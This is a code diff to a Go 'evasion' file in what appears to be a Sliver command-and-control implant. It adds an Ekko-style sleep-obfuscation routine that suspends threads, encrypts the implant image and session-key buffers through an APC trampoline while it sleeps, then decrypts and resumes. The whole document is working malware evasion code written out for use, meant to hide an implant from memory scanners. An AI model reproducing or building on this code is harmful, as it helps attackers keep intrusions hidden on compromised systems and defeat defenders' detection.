@@ -1,28 +1,50 @@
 package evasion
 
 /*
-	Windows Sleep Obfuscation
+	Windows Sleep Obfuscation — Ekko via APC trampoline
 
-	Full PE image encryption during sleep (Ekko/Foliage style) is NOT
-	implemented here. Those techniques require:
-	1. A timer-queue ROP chain that executes from kernel callbacks
-	2. Complete control over all executing threads
-	3. No concurrent runtime (GC, goroutines, network poller)
+	On Windows, sleep obfuscation uses the apc.Sleep implementation
+	(implant/sliver/apc/apc.go) adapted from BishopFox/sliver PR #1805:
 
-	Go's runtime cannot be frozen from userland — goroutines managed
-	by the Go scheduler continue executing even when the main thread
-	sleeps. Encrypting the .text section would crash those goroutines.
+	1. Suspends all image-based peer threads (with per-peer watchdog
+	   timers to guard against Go runtime P-handoff deadlocks)
+	2. Queues an x64 trampoline via QueueUserAPC that lives OUTSIDE
+	   the image (survives encryption)
+	3. Enters alertable wait; trampoline executes:
+	   VirtualProtect(RW) → SystemFunction032 encrypt → NtDelayExecution →
+	   SystemFunction032 decrypt → VirtualProtect(.text RX) → ret
+	4. Resumes all suspended peers
 
-	For full PE encryption, use a C shellcode loader that manages the
-	sleep cycle externally (encrypt payload region, sleep, decrypt,
-	resume). See loader/loader.c.
-
-	This file sets the Windows sleep handler to use the cross-platform
-	ChaCha20 data-region encryption from sleep_obfuscate.go, which
-	protects session keys and sensitive buffers without touching code
-	sections.
+	Combined with ChaCha20 data-region encryption for session keys
+	and sensitive buffers (from sleep_obfuscate.go).
 */
 
+import (
+	"time"
+
+	"github.com/bishopfox/sliver/implant/sliver/apc"
+)
+
 func init() {
-	SleepWithCallstackSpoof = ObfuscatedSleep
+	SleepWithCallstackSpoof = ekkoSleep
+}
+
+func ekkoSleep(duration time.Duration) {
+	// Encrypt sensitive data regions (session keys, etc.)
+	encryptRegions()
+	defer decryptRegions()
+
+	ms := uint64(duration.Milliseconds())
+	if ms == 0 {
+		return
+	}
+
+	// Use the full Ekko implementation: suspend peers, encrypt PE image,
+	// sleep via NtDelayExecution, decrypt, resume peers
+	err := apc.Sleep(ms)
+	if err != nil {
+		// Fallback to plain sleep if Ekko fails (non-Windows arch at
+		// runtime, or thread suspension issue)
+		time.Sleep(duration)
+	}
 }
